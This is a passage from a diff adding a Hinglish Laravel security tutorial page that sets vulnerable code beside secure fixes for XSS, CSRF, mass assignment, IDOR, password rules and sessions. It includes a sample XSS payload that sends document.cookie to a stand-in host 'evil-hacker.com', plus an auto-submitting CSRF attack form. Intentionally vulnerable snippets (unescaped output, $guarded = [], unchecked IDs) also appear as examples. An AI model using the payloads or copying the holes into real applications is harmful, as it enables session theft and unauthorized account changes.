+            <span class="str">'end_date'</span>   => <span class="str">'required|date|after_or_equal:start_date'</span>,
+            <span class="str">'category'</span>   => <span class="str">'required|string|max:50'</span>,
+        ]);
+
+        <span class="cm">// 2. Numeric inputs ko explicitly int cast karo (Zero chance of injection!)</span>
+        $limit = <span class="fn">max</span>(<span class="num">1</span>, <span class="fn">min</span>(<span class="num">100</span>, (<span class="kw">int</span>) $request-><span class="fn">input</span>(<span class="str">'limit'</span>, <span class="num">25</span>)));
+
+        <span class="cm">// 3. Query mein values ko question mark (?) binding array mein pass karo</span>
+        $revenue = <span class="cl">DB</span>::<span class="fn">select</span>(<span class="str">"
+            SELECT
+                DATE(created_at) AS order_date,
+                SUM(total) AS daily_revenue,
+                COUNT(id) AS total_orders
+            FROM orders
+            WHERE created_at BETWEEN ? AND ?
+              AND category = ?
+              AND status = 'paid'
+            GROUP BY DATE(created_at)
+            ORDER BY order_date ASC
+            LIMIT ?
+        "</span>, [
+            $validated[<span class="str">'start_date'</span>],
+            $validated[<span class="str">'end_date'</span>],
+            $validated[<span class="str">'category'</span>],
+            $limit,
+        ]);
+
+        <span class="kw">return</span> <span class="fn">response</span>()-><span class="fn">json</span>([<span class="str">'data'</span> => $revenue]);
+    }
+}</pre>
+    </div>
+  </div>
+</div>
+
+
+<!-- SECTION 3: XSS PREVENTION -->
+<div id="sec-xss" class="section-panel">
+  <div class="section-title">&#x1F4BB; Cross-Site Scripting (XSS) &mdash; A03</div>
+  <p class="section-subtitle"><span class="vuln-tag tag-critical">CRITICAL</span> XSS attacker ko doosre users ke browser mein malicious JavaScript inject karne deta hai, jisse session cookies, auth tokens chori ho sakte hain ya user ke behalf par actions execute ho jate hain.</p>
+
+  <div class="card">
+    <div class="card-title">&#x274C; Vulnerable vs &#x2705; Safe Output in Blade Templates</div>
+    <div class="two-col">
+      <div>
+        <div style="font-size:0.78rem;font-weight:700;color:var(--accent-red);text-transform:uppercase;letter-spacing:1px;margin-bottom:8px;text-align:center;">&#x274C; VULNERABLE (Unescaped)</div>
+        <div class="code-block" style="margin:0">
+          <div class="code-header"><span class="code-lang">html</span><span class="code-filename">views/product.blade.php</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+          <pre style="font-size:0.8rem"><span class="cm">&lt;!-- DANGEROUS: Raw unescaped rendering --&gt;</span>
+&lt;h1&gt;{!! $product->name !!}&lt;/h1&gt;
+&lt;p&gt;{!! $user->bio !!}&lt;/p&gt;
+&lt;span&gt;Search: {!! request('q') !!}&lt;/span&gt;
+
+<span class="cm">&lt;!-- Attacker Input Payload: --&gt;</span>
+&lt;script&gt;
+  fetch('https://evil-hacker.com/steal?c='
+    + encodeURIComponent(document.cookie));
+&lt;/script&gt;
+
+<span class="cm">&lt;!-- Result: Attacker admin ki cookies chura lega! --&gt;</span></pre>
+        </div>
+      </div>
+
+      <div>
+        <div style="font-size:0.78rem;font-weight:700;color:var(--accent-green);text-transform:uppercase;letter-spacing:1px;margin-bottom:8px;text-align:center;">&#x2705; SECURE (Auto-Escaped)</div>
+        <div class="code-block" style="margin:0">
+          <div class="code-header"><span class="code-lang">html</span><span class="code-filename">views/product.blade.php</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+          <pre style="font-size:0.8rem"><span class="cm">&lt;!-- SAFE: Laravel auto-escapes htmlspecialchars --&gt;</span>
+&lt;h1&gt;{{ $product->name }}&lt;/h1&gt;
+&lt;p&gt;{{ $user->bio }}&lt;/p&gt;
+&lt;span&gt;Search: {{ request('q') }}&lt;/span&gt;
+
+<span class="cm">&lt;!-- Laravel output transforms to: --&gt;</span>
+&amp;lt;script&amp;gt;fetch(...)&amp;lt;/script&amp;gt;
+
+<span class="cm">&lt;!-- Browser isko plain text display karega,
+     kisi bhi halat mein execute nahi karega! --&gt;</span></pre>
+        </div>
+      </div>
+    </div>
+
+    <div class="alert alert-warn">
+      <span class="alert-icon">&#x26A0;&#xFE0F;</span>
+      <div class="alert-body">
+        <strong>Kab <code>{!! !!}</code> use karna legitimate hota hai?</strong><br/>
+        Sirf tab jab content server-side verified ho aur kisi trusted HTML Sanitizer (jaise HTMLPurifier) se pehle clean kiya gaya ho (e.g. blog posts ya CMS descriptions). Kabhie bhi raw user-provided input ko unescaped render mat karein!
+      </div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">&#x1F9F9; Rich Text (WYSIWYG) Ko HTMLPurifier Se Clean Karna</div>
+    <p style="color:var(--text-secondary);margin-bottom:14px">Jab users ko blog post ya product description mein bold, italic, lists format karne ki ijazat deni ho, toh <code>mews/purifier</code> use karein:</p>
+
+    <div class="code-block">
+      <div class="code-header"><span class="code-lang">bash</span><span class="code-filename">Terminal</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+      <pre><span class="cm"># HTML Purifier package install karo</span>
+composer require mews/purifier</pre>
+    </div>
+
+    <div class="code-block">
+      <div class="code-header"><span class="code-lang">php</span><span class="code-filename">app/Http/Controllers/ProductController.php</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+      <pre><span class="ph">&lt;?php</span>
+
+<span class="kw">namespace</span> AppHttpControllers;
+
+<span class="kw">use</span> <span class="cl">AppModelsProduct</span>;
+<span class="kw">use</span> <span class="cl">IlluminateHttpRequest</span>;
+<span class="kw">use</span> <span class="cl">MewsPurifierFacadesPurifier</span>;
+
+<span class="kw">class</span> <span class="cl">ProductController</span> <span class="kw">extends</span> <span class="cl">Controller</span>
+{
+    <span class="kw">public function</span> <span class="fn">store</span>(<span class="cl">Request</span> $request)
+    {
+        $request-><span class="fn">validate</span>([
+            <span class="str">'name'</span>        => <span class="str">'required|string|max:255'</span>,
+            <span class="str">'description'</span> => <span class="str">'required|string|max:10000'</span>,
+        ]);
+
+        <span class="cm">/*
+         * Purifier::clean() saare &lt;script&gt;, &lt;iframe&gt;, onload="", onerror=""
+         * events ko strip off kar deta hai aur sirf safe tags (&lt;p&gt;, &lt;b&gt;, &lt;ul&gt;, etc.)
+         * rehne deta hai.
+         */</span>
+        $cleanHtml = <span class="cl">Purifier</span>::<span class="fn">clean</span>($request-><span class="fn">input</span>(<span class="str">'description'</span>));
+
+        <span class="cl">Product</span>::<span class="fn">create</span>([
+            <span class="str">'name'</span>        => $request->name,
+            <span class="str">'description'</span> => $cleanHtml, <span class="cm">// Ab isko Blade mein {!! $product->description !!} safe render kar sakte hain</span>
+        ]);
+
+        <span class="kw">return</span> <span class="fn">redirect</span>()-><span class="fn">route</span>(<span class="str">'products.index'</span>);
+    }
+}</pre>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">&#x1F510; JavaScript (Vue / React / Blade) Context Mein Safe Data Passing</div>
+    <p style="color:var(--text-secondary);margin-bottom:14px">Blade template ke andar direct JavaScript variables assign karte waqt quote-escaping breaks se XSS paida ho sakti hai:</p>
+
+    <div class="code-block">
+      <div class="code-header"><span class="code-lang">html</span><span class="code-filename">Safe JS Data Passing in Blade</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+      <pre><span class="cm">&lt;!-- &#x274C; FATAL MISTAKE: Raw string quotes break ho sakti hain --&gt;</span>
+&lt;script&gt;
+  var userName = "{{ $user->name }}"; <span class="cm">// If name is: "; alert('XSS'); var x = "</span>
+&lt;/script&gt;
+
+<span class="cm">&lt;!-- &#x2705; SAFE WAY 1: @js directive (Laravel 9+ standard) --&gt;</span>
+&lt;script&gt;
+  const user = @js($user->only(['id', 'name', 'email']));
+&lt;/script&gt;
+
+<span class="cm">&lt;!-- &#x2705; SAFE WAY 2: Data attributes (CSP friendly) --&gt;</span>
+&lt;div id="app-root" data-user="{{ json_encode($user->only(['id', 'name'])) }}"&gt;&lt;/div&gt;
+
+<span class="cm">&lt;!-- &#x2705; SAFE WAY 3: Inertia.js with API Resources (Best practice for Vue/React) --&gt;</span>
+<span class="kw">return</span> <span class="cl">Inertia</span>::<span class="fn">render</span>(<span class="str">'Dashboard'</span>, [
+    <span class="str">'user'</span>    => <span class="kw">new</span> <span class="cl">UserResource</span>($user),
+    <span class="str">'orders'</span>  => <span class="cl">OrderResource</span>::<span class="fn">collection</span>($orders),
+]);</pre>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">&#x1F4CB; Content Security Policy (CSP) Header Middleware</div>
+    <p style="color:var(--text-secondary);margin-bottom:14px">CSP browser ko instruct karta hai ki sirf authorized domains se hi scripts, styles, aur iframes execute ho sakein:</p>
+
+    <div class="code-block">
+      <div class="code-header"><span class="code-lang">php</span><span class="code-filename">app/Http/Middleware/ContentSecurityPolicy.php</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+      <pre><span class="ph">&lt;?php</span>
+
+<span class="kw">namespace</span> AppHttpMiddleware;
+
+<span class="kw">use</span> <span class="cl">Closure</span>;
+<span class="kw">use</span> <span class="cl">IlluminateHttpRequest</span>;
+
+<span class="kw">class</span> <span class="cl">ContentSecurityPolicy</span>
+{
+    <span class="kw">public function</span> <span class="fn">handle</span>(<span class="cl">Request</span> $request, <span class="cl">Closure</span> $next)
+    {
+        $response = $next($request);
+
+        <span class="cm">// CSP Policy definition</span>
+        $csp = [
+            <span class="str">"default-src 'self'"</span>,
+            <span class="str">"script-src 'self' https://js.stripe.com https://cdn.jsdelivr.net"</span>,
+            <span class="str">"style-src 'self' 'unsafe-inline' https://fonts.googleapis.com"</span>,
+            <span class="str">"font-src 'self' https://fonts.gstatic.com"</span>,
+            <span class="str">"img-src 'self' data: https: blob:"</span>,
+            <span class="str">"frame-src https://js.stripe.com"</span>,
+            <span class="str">"object-src 'none'"</span>,
+            <span class="str">"base-uri 'self'"</span>,
+        ];
+
+        $response-><span class="fn">headers</span>-><span class="fn">set</span>(<span class="str">'Content-Security-Policy'</span>, <span class="fn">implode</span>(<span class="str">'; '</span>, $csp));
+
+        <span class="kw">return</span> $response;
+    }
+}</pre>
+    </div>
+  </div>
+</div>
+
+
+<!-- SECTION 4: CSRF PROTECTION -->
+<div id="sec-csrf" class="section-panel">
+  <div class="section-title">&#x1F510; Cross-Site Request Forgery (CSRF) &mdash; A01</div>
+  <p class="section-subtitle"><span class="vuln-tag tag-high">HIGH</span> CSRF tab hota hai jab ek logged-in user kisi malicious website par visit karta hai aur wo website background mein user ke active session cookie ka faida utha kar aapke app par unwanted state-changing action execute kar deti hai.</p>
+
+  <div class="card">
+    <div class="card-title">&#x1F914; CSRF Attack Kaise Kaam Karta Hai? (The Silent Theft)</div>
+    <div class="code-block">
+      <div class="code-header"><span class="code-lang">html</span><span class="code-filename">evil-site.com/free-iphone.html (Attacker's Trap)</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+      <pre><span class="cm">&lt;!-- Scenario: User shopsphere.com par already logged in hai --&gt;</span>
+<span class="cm">&lt;!-- User attacker ke link par click karta hai jo ye background form submit karta hai: --&gt;</span>
+
+&lt;form id="evil-form" action="https://shopsphere.com/account/delete" method="POST"&gt;
+    &lt;input type="hidden" name="confirm" value="yes"/&gt;
+&lt;/form&gt;
+
+&lt;script&gt;
+    <span class="cm">// User ke aate hi page silently form submit kar deta hai</span>
+    document.getElementById('evil-form').submit();
+&lt;/script&gt;
+
+<span class="cm">&lt;!-- Browser automatically shopsphere.com ki session cookie sath bhej deta hai!
+     Agar CSRF protection na ho, toh server isko valid user action samajh lega. --&gt;</span></pre>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">&#x2705; Laravel CSRF Shield &mdash; Complete Implementation Guide</div>
+    <p style="color:var(--text-secondary);margin-bottom:14px">Laravel har active user session ke sath ek cryptographic secret token associate karta hai. Koi bhi POST, PUT, PATCH, DELETE request bina is token ke sidha <code>419 Page Expired</code> throw karegi:</p>
+
+    <div class="code-block">
+      <div class="code-header"><span class="code-lang">html</span><span class="code-filename">resources/views/checkout.blade.php</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+      <pre><span class="cm">&lt;!-- &#x2705; Blade Forms: Hamesha @csrf include karein --&gt;</span>
+&lt;form method="POST" action="{{ route('checkout.process') }}"&gt;
+    @csrf
+    @method('POST') <span class="cm">&lt;!-- PUT/PATCH/DELETE ke liye method spoofing --&gt;</span>
+
+    &lt;input type="text" name="address" required placeholder="Shipping Address"/&gt;
+    &lt;button type="submit"&gt;Place Order&lt;/button&gt;
+&lt;/form&gt;
+
+<span class="cm">&lt;!-- @csrf directive background mein ye hidden input generate karta hai:
+     &lt;input type="hidden" name="_token" value="dF9jK3s...60charRandomString"&gt; --&gt;</span></pre>
+    </div>
+
+    <div class="code-block">
+      <div class="code-header"><span class="code-lang">javascript</span><span class="code-filename">resources/js/bootstrap.js (Axios AJAX Setup)</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+      <pre><span class="cm">// Modern SPA / Vue / React ke liye Axios CSRF setup</span>
+<span class="kw">import</span> axios <span class="kw">from</span> <span class="str">'axios'</span>;
+
+<span class="cm">// 1. Meta tag se CSRF token read karo</span>
+<span class="kw">const</span> token = document.querySelector(<span class="str">'meta[name="csrf-token"]'</span>)?.getAttribute(<span class="str">'content'</span>);
+<span class="kw">if</span> (token) {
+    axios.defaults.headers.common[<span class="str">'X-CSRF-TOKEN'</span>] = token;
+}
+
+<span class="cm">// 2. Sanctum SPA ke liye automatic XSRF-TOKEN cookie support</span>
+axios.defaults.withCredentials = <span class="kw">true</span>;
+axios.defaults.withXSRFToken = <span class="kw">true</span>;
+
+<span class="cm">// Blade master layout ke &lt;head&gt; mein ye meta tag lazmi hona chahiye:
+// &lt;meta name="csrf-token" content="{{ csrf_token() }}"&gt;</span></pre>
+    </div>
+
+    <div class="code-block">
+      <div class="code-header"><span class="code-lang">php</span><span class="code-filename">bootstrap/app.php (Webhook CSRF Exclusion &amp; Signature Guard)</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+      <pre><span class="ph">&lt;?php</span>
+
+<span class="cm">// Laravel 11/12 bootstrap/app.php mein webhooks ko CSRF se exempt karein</span>
+-><span class="fn">withMiddleware</span>(<span class="kw">function</span> (<span class="cl">Middleware</span> $middleware) {
+    $middleware-><span class="fn">validateCsrfTokens</span>(except: [
+        <span class="str">'stripe/webhook'</span>,
+        <span class="str">'paypal/ipn'</span>,
+        <span class="str">'api/external/*'</span>,
+    ]);
+})
+
+<span class="cm">// &#x26A0;&#xFE0F; CRITICAL: Webhooks ko CSRF se hatane ke baad unka Signature verify karna MUST hai!</span>
+<span class="kw">namespace</span> AppHttpControllers;
+
+<span class="kw">use</span> <span class="cl">IlluminateHttpRequest</span>;
+<span class="kw">use</span> <span class="cl">StripeWebhook</span>;
+<span class="kw">use</span> <span class="cl">StripeExceptionSignatureVerificationException</span>;
+
+<span class="kw">class</span> <span class="cl">StripeWebhookController</span> <span class="kw">extends</span> <span class="cl">Controller</span>
+{
+    <span class="kw">public function</span> <span class="fn">handle</span>(<span class="cl">Request</span> $request)
+    {
+        $payload = $request-><span class="fn">getContent</span>();
+        $sigHeader = $request-><span class="fn">header</span>(<span class="str">'Stripe-Signature'</span>);
+        $secret = <span class="fn">config</span>(<span class="str">'services.stripe.webhook_secret'</span>);
+
+        <span class="kw">try</span> {
+            $event = <span class="cl">Webhook</span>::<span class="fn">constructEvent</span>($payload, $sigHeader, $secret);
+        } <span class="kw">catch</span> (<span class="cl">SignatureVerificationException</span> $e) {
+            <span class="cm">// Agar signature match nahi hua toh direct 400 Bad Request</span>
+            <span class="kw">return</span> <span class="fn">response</span>()-><span class="fn">json</span>([<span class="str">'error'</span> => <span class="str">'Invalid Webhook Signature'</span>], <span class="num">400</span>);
+        }
+
+        <span class="cm">// Handle event safely</span>
+        <span class="kw">return</span> <span class="fn">response</span>()-><span class="fn">json</span>([<span class="str">'status'</span> => <span class="str">'success'</span>]);
+    }
+}</pre>
+    </div>
+  </div>
+</div>
+
+
+<!-- SECTION 5: MASS ASSIGNMENT -->
+<div id="sec-mass" class="section-panel">
+  <div class="section-title">&#x1F4CB; Mass Assignment Protection &mdash; A08</div>
+  <p class="section-subtitle"><span class="vuln-tag tag-high">HIGH</span> Mass assignment vulnerability tab aati hai jab HTTP request ke saare parameters ko blindly database model mein pass kar diya jata hai (<code>Model::create($request->all())</code>), jisse attacker unauthorized sensitive fields manipulate kar leta hai.</p>
+
+  <div class="card">
+    <div class="card-title">&#x274C; Vulnerable vs &#x2705; Secure Architecture</div>
+    <div class="two-col">
+      <div>
+        <div style="font-size:0.78rem;font-weight:700;color:var(--accent-red);margin-bottom:8px;text-align:center;">&#x274C; VULNERABLE ($request->all() Trap)</div>
+        <div class="code-block" style="margin:0">
+          <div class="code-header"><span class="code-lang">php</span><span class="code-filename">DangerousUserController.php</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+          <pre style="font-size:0.8rem"><span class="ph">&lt;?php</span>
+
+<span class="cm">// Model mein koi fillable restrict nahi hai ya $guarded = [] hai</span>
+<span class="kw">class</span> <span class="cl">User</span> <span class="kw">extends</span> <span class="cl">Model</span> {
+    <span class="kw">protected</span> $guarded = []; <span class="cm">// FATAL MISTAKE!</span>
+}
+
+<span class="cm">// Controller:</span>
+<span class="kw">public function</span> <span class="fn">update</span>(<span class="cl">Request</span> $request, <span class="cl">User</span> $user) {
+    <span class="cm">// Attacker payload sends:</span>
+    <span class="cm">// name="Ali"</span>
+    <span class="cm">// is_admin=1           &lt;-- Injected!</span>
+    <span class="cm">// email_verified_at=now &lt;-- Injected!</span>
+    <span class="cm">// balance=999999       &lt;-- Injected!</span>
+
+    $user-><span class="fn">update</span>($request-><span class="fn">all</span>()); <span class="cm">// Attacker superadmin ban gaya!</span>
+}</pre>
+        </div>
+      </div>
+
+      <div>
+        <div style="font-size:0.78rem;font-weight:700;color:var(--accent-green);margin-bottom:8px;text-align:center;">&#x2705; SECURE ($fillable + validated())</div>
+        <div class="code-block" style="margin:0">
+          <div class="code-header"><span class="code-lang">php</span><span class="code-filename">SecureUserController.php</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+          <pre style="font-size:0.8rem"><span class="ph">&lt;?php</span>
+
+<span class="cm">// Model explicitly whitelists allowed columns</span>
+<span class="kw">class</span> <span class="cl">User</span> <span class="kw">extends</span> <span class="cl">Model</span> {
+    <span class="kw">protected</span> $fillable = [
+        <span class="str">'name'</span>,
+        <span class="str">'email'</span>,
+        <span class="str">'phone'</span>,
+        <span class="str">'avatar_url'</span>,
+    ];
+}
+
+<span class="cm">// Controller:</span>
+<span class="kw">public function</span> <span class="fn">update</span>(<span class="cl">UpdateUserRequest</span> $request, <span class="cl">User</span> $user) {
+    <span class="cm">// ->validated() sirf FormRequest rules ke fields return karta hai</span>
+    $user-><span class="fn">update</span>($request-><span class="fn">validated</span>());
+    <span class="cm">// is_admin ya balance silently discard ho jayenge!</span>
+}</pre>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">&#x2705; Enterprise Best Practice: Form Requests + $fillable + Strict Dev Mode</div>
+    <p style="color:var(--text-secondary);margin-bottom:14px">Production-grade Laravel applications mein validation aur model defense layer dono milkar kaam karti hain:</p>
+
+    <div class="code-block">
+      <div class="code-header"><span class="code-lang">php</span><span class="code-filename">app/Http/Requests/StoreProductRequest.php</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+      <pre><span class="ph">&lt;?php</span>
+
+<span class="kw">namespace</span> AppHttpRequests;
+
+<span class="kw">use</span> <span class="cl">IlluminateFoundationHttpFormRequest</span>;
+
+<span class="kw">class</span> <span class="cl">StoreProductRequest</span> <span class="kw">extends</span> <span class="cl">FormRequest</span>
+{
+    <span class="kw">public function</span> <span class="fn">authorize</span>(): <span class="kw">bool</span>
+    {
+        <span class="cm">// Authorization check: Only staff or sellers can create products</span>
+        <span class="kw">return</span> $this-><span class="fn">user</span>()?-><span class="fn">can</span>(<span class="str">'create'</span>, <span class="cl">AppModelsProduct</span>::<span class="kw">class</span>) ?? <span class="kw">false</span>;
+    }
+
+    <span class="kw">public function</span> <span class="fn">rules</span>(): <span class="kw">array</span>
+    {
+        <span class="kw">return</span> [
+            <span class="str">'name'</span>        => [<span class="str">'required'</span>, <span class="str">'string'</span>, <span class="str">'max:255'</span>],
+            <span class="str">'sku'</span>         => [<span class="str">'required'</span>, <span class="str">'string'</span>, <span class="str">'unique:products,sku'</span>],
+            <span class="str">'price'</span>       => [<span class="str">'required'</span>, <span class="str">'numeric'</span>, <span class="str">'min:0.01'</span>],
+            <span class="str">'stock'</span>       => [<span class="str">'required'</span>, <span class="str">'integer'</span>, <span class="str">'min:0'</span>],
+            <span class="str">'category_id'</span> => [<span class="str">'required'</span>, <span class="str">'exists:categories,id'</span>],
+            <span class="str">'description'</span> => [<span class="str">'nullable'</span>, <span class="str">'string'</span>, <span class="str">'max:5000'</span>],
+        ];
+        <span class="cm">// Notice: 'internal_margin', 'is_promoted', 'vendor_payout' yahan nahi hain!</span>
+    }
+}</pre>
+    </div>
+
+    <div class="code-block">
+      <div class="code-header"><span class="code-lang">php</span><span class="code-filename">app/Providers/AppServiceProvider.php (Catching Silent Bugs in Dev)</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+      <pre><span class="ph">&lt;?php</span>
+
+<span class="kw">namespace</span> AppProviders;
+
+<span class="kw">use</span> <span class="cl">IlluminateDatabaseEloquentModel</span>;
+<span class="kw">use</span> <span class="cl">IlluminateSupportServiceProvider</span>;
+
+<span class="kw">class</span> <span class="cl">AppServiceProvider</span> <span class="kw">extends</span> <span class="cl">ServiceProvider</span>
+{
+    <span class="kw">public function</span> <span class="fn">boot</span>(): <span class="kw">void</span>
+    {
+        <span class="cm">/*
+         * SENIOR PRO-TIP:
+         * Agar kisi ne galti se un-fillable attribute pass kiya,
+         * toh development/local environment mein exception throw karo
+         * taaki silent data loss na ho, lekin production mein crash mat hone do.
+         */</span>
+        <span class="cl">Model</span>::<span class="fn">preventSilentlyDiscardingAttributes</span>(! $this->app-><span class="fn">isProduction</span>());
+
+        <span class="cm">// Lazy loading N+1 queries ko bhi dev mein strict block karo</span>
+        <span class="cl">Model</span>::<span class="fn">preventLazyLoading</span>(! $this->app-><span class="fn">isProduction</span>());
+    }
+}</pre>
+    </div>
+
+    <div class="alert alert-danger">
+      <span class="alert-icon">&#x1F6A8;</span>
+      <div class="alert-body">
+        <strong>Golden Rule: Kabhie bhi <code>protected $guarded = [];</code> use mat karo!</strong><br/>
+        YouTube tutorials ya quick prototypes mein log shortcut ke liye <code>$guarded = []</code> likh dete hain. Production mein yeh seedha zero security barrier ban jata hai jisse koi bhi public user database ki sensitive columns modify kar sakta hai.
+      </div>
+    </div>
+  </div>
+</div>
+
+
+<!-- SECTION 6: BROKEN AUTH & IDOR -->
+<div id="sec-auth" class="section-panel">
+  <div class="section-title">&#x1F511; Broken Authentication &amp; IDOR &mdash; A07 / A01</div>
+  <p class="section-subtitle"><span class="vuln-tag tag-critical">CRITICAL</span> Weak password policies, unhashed credentials, session fixation attacks, aur IDOR (Insecure Direct Object Reference) hackers ke sabse aasan darwaze hain.</p>
+
+  <div class="card">
+    <div class="card-title">&#x1F512; Modern Password Security &amp; Have I Been Pwned? Integration</div>
+    <p style="color:var(--text-secondary);margin-bottom:14px">Laravel ka built-in <code>Password</code> validation rule passwords ko dictionary attacks aur compromised database leaks ke khilaf check karta hai:</p>
+
+    <div class="code-block">
+      <div class="code-header"><span class="code-lang">php</span><span class="code-filename">app/Providers/AppServiceProvider.php (Global Password Rules)</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+      <pre><span class="ph">&lt;?php</span>
+
+<span class="kw">namespace</span> AppProviders;
+
+<span class="kw">use</span> <span class="cl">IlluminateSupportServiceProvider</span>;
+<span class="kw">use</span> <span class="cl">IlluminateValidationRulesPassword</span>;
+
+<span class="kw">class</span> <span class="cl">AppServiceProvider</span> <span class="kw">extends</span> <span class="cl">ServiceProvider</span>
+{
+    <span class="kw">public function</span> <span class="fn">boot</span>(): <span class="kw">void</span>
+    {
+        <span class="cm">// Production mein airtight enterprise password rules set karo</span>
+        <span class="cl">Password</span>::<span class="fn">defaults</span>(<span class="kw">function</span> () {
+            $rule = <span class="cl">Password</span>::<span class="fn">min</span>(<span class="num">10</span>)
+                -><span class="fn">letters</span>()          <span class="cm">// Kam az kam 1 alphabet</span>
+                -><span class="fn">mixedCase</span>()        <span class="cm">// Uppercase aur lowercase dono</span>
+                -><span class="fn">numbers</span>()          <span class="cm">// Kam az kam 1 number</span>
+                -><span class="fn">symbols</span>();         <span class="cm">// Special characters (@, #, $, etc.)</span>
+
+            <span class="cm">/*
+             * uncompromised() Have I Been Pwned API par k-Anonymity SHA-1 hash bhejta hai.
+             * Agar password pehle kisi public data breach mein leak ho chuka hai,
+             * toh user ko turant reject kar deta hai!
+             */</span>
+            <span class="kw">return</span> $this->app-><span class="fn">isProduction</span>()
+                ? $rule-><span class="fn">uncompromised</span>(<span class="num">3</span>) <span class="cm">// 3 ya zyada breaches mein leaked password block karo</span>
+                : <span class="cl">Password</span>::<span class="fn">min</span>(<span class="num">6</span>);
+        });
+    }
+}</pre>
+    </div>
+
+    <div class="code-block">
+      <div class="code-header"><span class="code-lang">php</span><span class="code-filename">AuthController.php (Registration Rule Usage)</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+      <pre><span class="cm">// Controller validation mein clean default rules use karein</span>
+$request-><span class="fn">validate</span>([
+    <span class="str">'email'</span>    => [<span class="str">'required'</span>, <span class="str">'string'</span>, <span class="str">'email'</span>, <span class="str">'max:255'</span>, <span class="str">'unique:users'</span>],
+    <span class="str">'password'</span> => [<span class="str">'required'</span>, <span class="str">'confirmed'</span>, <span class="cl">Password</span>::<span class="fn">defaults</span>()],
+]);
+
+<span class="cm">// Password hashing: Hamesha Hash facade use karein (Bcrypt / Argon2id)</span>
+$user = <span class="cl">User</span>::<span class="fn">create</span>([
+    <span class="str">'name'</span>     => $request->name,
+    <span class="str">'email'</span>    => $request->email,
+    <span class="str">'password'</span> => <span class="cl">Hash</span>::<span class="fn">make</span>($request->password),
+]);</pre>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">&#x1F194; IDOR (Insecure Direct Object Reference) Attack &amp; Policy Shield</div>
+    <p style="color:var(--text-secondary);margin-bottom:14px">IDOR tab hota hai jab URL ke ID parameter ko bina ownership check kiye database se return kar diya jaye:</p>
+
+    <div class="code-block">
+      <div class="code-header"><span class="code-lang">php</span><span class="code-filename">VulnerableOrderController.php (IDOR Vulnerability)</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+      <pre><span class="cm">// &#x274C; FATAL IDOR: Attacker /api/orders/500 hit karke User B ka private invoice dekh leta hai</span>
+<span class="kw">public function</span> <span class="fn">show</span>(<span class="kw">int</span> $id)
+{
+    $order = <span class="cl">Order</span>::<span class="fn">findOrFail</span>($id);
+    <span class="kw">return new</span> <span class="cl">OrderResource</span>($order); <span class="cm">// Koi ownership check nahi! Zero authorization!</span>
+}</pre>
+    </div>
+
+    <div class="code-block">
+      <div class="code-header"><span class="code-lang">php</span><span class="code-filename">app/Policies/OrderPolicy.php &amp; SecureController.php</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+      <pre><span class="ph">&lt;?php</span>
+
+<span class="kw">namespace</span> AppPolicies;
+
+<span class="kw">use</span> <span class="cl">AppModelsOrder</span>;
+<span class="kw">use</span> <span class="cl">AppModelsUser</span>;
+
+<span class="kw">class</span> <span class="cl">OrderPolicy</span>
+{
+    <span class="cm">/**
+     * Sirf wahi user apna order dekh sakta hai jiska order_id usse belong karta ho,
+     * ya customer-support superadmin ho.
+     */</span>
+    <span class="kw">public function</span> <span class="fn">view</span>(<span class="cl">User</span> $user, <span class="cl">Order</span> $order): <span class="kw">bool</span>
+    {
+        <span class="kw">return</span> $user->id === $order->user_id || $user-><span class="fn">isAdmin</span>();
+    }
+
+    <span class="kw">public function</span> <span class="fn">cancel</span>(<span class="cl">User</span> $user, <span class="cl">Order</span> $order): <span class="kw">bool</span>
+    {
+        <span class="kw">return</span> $user->id === $order->user_id &amp;&amp; $order->status === <span class="str">'pending'</span>;
+    }
+}
+
+<span class="cm">// Controller mein Policy enforce karne ke do production tarike:</span>
+<span class="kw">public function</span> <span class="fn">show</span>(<span class="cl">Order</span> $order)
+{
+    <span class="cm">// Tarika 1: Policy Gate Check (403 Forbidden agar unauthorized ho)</span>
+    $this-><span class="fn">authorize</span>(<span class="str">'view'</span>, $order);
+
+    <span class="cm">// Tarika 2: Scoped Relationship Query (404 Not Found return karega if not owned)</span>
+    <span class="cm">// $order = auth()->user()->orders()->findOrFail($order->id);</span>
+
+    <span class="kw">return new</span> <span class="cl">OrderResource</span>($order);
+}</pre>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">&#x1F4F1; Session Hardening &amp; Session Fixation Prevention</div>
+    <p style="color:var(--text-secondary);margin-bottom:14px">Session hijacking se bachne ke liye <code>config/session.php</code> ko enterprise standard par configure karein aur login par session ID regenerate karein:</p>
+
+    <div class="code-block">
+      <div class="code-header"><span class="code-lang">php</span><span class="code-filename">config/session.php (Hardened Production Settings)</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+      <pre><span class="ph">&lt;?php</span>
+
+<span class="kw">return</span> [
+    <span class="cm">// Production sessions ko Redis memory store mein rakhein, local filesystem par nahi</span>
+    <span class="str">'driver'</span>          => <span class="fn">env</span>(<span class="str">'SESSION_DRIVER'</span>, <span class="str">'redis'</span>),
+
+    <span class="str">'lifetime'</span>        => <span class="num">120</span>, <span class="cm">// Inactivity ke 2 ghante baad session expire</span>
+    <span class="str">'expire_on_close'</span> => <span class="kw">false</span>,
